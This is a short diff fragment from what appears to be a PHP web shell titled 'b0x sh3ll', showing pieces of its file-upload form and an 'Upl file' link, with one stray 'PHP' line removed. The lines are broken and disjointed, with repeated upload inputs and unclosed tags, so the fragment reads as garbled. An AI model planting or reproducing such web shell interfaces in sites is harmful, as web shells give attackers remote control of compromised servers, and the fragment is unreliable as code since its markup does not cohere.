@@ -188,8 +188,7 @@ kill_the_net
 input name="_upl" type="submit" id="_upl" value="Upload
 <input type="file" name="__">
 <p align="center"><center><font style="font-size:13px" color="#008000" face="Trebuchet MS">
-&mode=upload'>Upl file</a>
-PHP 
+&mode=upload'>Upl file</a> 
 input type="submit" name="submit" value="  >>"
 <title>b0x sh3ll;</title>
 <input name="_upl" type="submit" id="_upl" value="Upload">
